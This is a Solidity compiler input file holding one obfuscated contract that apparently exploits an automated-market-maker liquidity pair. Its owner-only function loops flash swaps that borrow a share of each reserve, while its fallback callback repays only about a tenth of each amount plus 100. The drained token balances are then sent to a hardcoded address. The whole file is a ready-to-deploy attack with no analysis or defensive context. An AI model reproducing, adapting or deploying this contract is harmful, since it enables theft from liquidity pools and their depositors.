{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 2000
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "2.sol": {
      "content": "pragma solidity >=0.7.1;\n\n// import 'console.sol';\n\nlibrary T {\n    function y(address token, address to, uint value) internal {\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');\n    }\n}\n\ninterface I {\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function transfer(address to, uint value) external returns (bool);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function balanceOf(address owner) external view returns (uint);\n    // function sync() external;\n}\n\ncontract pp0{\n    function lpaiqj33p(address pair,address token0,address token1,uint n,uint z) public{\n        require(msg.sender == 0x5676E585bf16387bc159Fd4f82416434Cda5f1A3);\n        // I(pair).sync();\n        uint z1 = z;\n        uint u0;\n        uint u1;\n        uint b0;\n        uint b1;\n        bytes memory d;\n        for(uint i=0;i<n;i++){\n            // I(pair).sync();\n            // console.log(\"loop\");\n            (u0,u1,) = I(pair).getReserves();\n            // console.log(\"u0: %s,u1: %s\",u0,u1);\n            b0 = u0/z1;\n            b1 = u1/z1;\n            // console.log(\"b0:%s,b1:%s\",b0,b1);\n            d = abi.encode(pair,token0,token1,b0/10+100,0);\n            I(pair).swap(b0, 0, address(this), d);\n            d = abi.encode(pair,token0,token1,0,b1/10+100);\n            I(pair).swap(0, b1, address(this), d);\n        }\n        uint b00 = I(token0).balanceOf(address(this));\n        uint b11 = I(token1).balanceOf(address(this));\n        // console.log(b00,b11);\n        I(token0).transfer(0x5676E585bf16387bc159Fd4f82416434Cda5f1A3,b00);\n        T.y(token1,0x5676E585bf16387bc159Fd4f82416434Cda5f1A3,b11);\n    }\n\n    fallback() external payable{\n        // console.log(\"fallback\");\n        (address pair,address token0,address token1,uint n0,uint n1) = abi.decode(msg.data[164:],(address,address,address,uint,uint));\n        if (n0>0){\n            I(token0).transfer(pair,n0);\n        }\n        if (n1>0){\n            // uint b11 = I(token1).balanceOf(address(this));\n            // console.log(\"b11:\",b11);\n            // I(token1).transfer(pair,n1);\n            T.y(token1,pair,n1);\n        }\n    }\n\n}"
    }
  }
}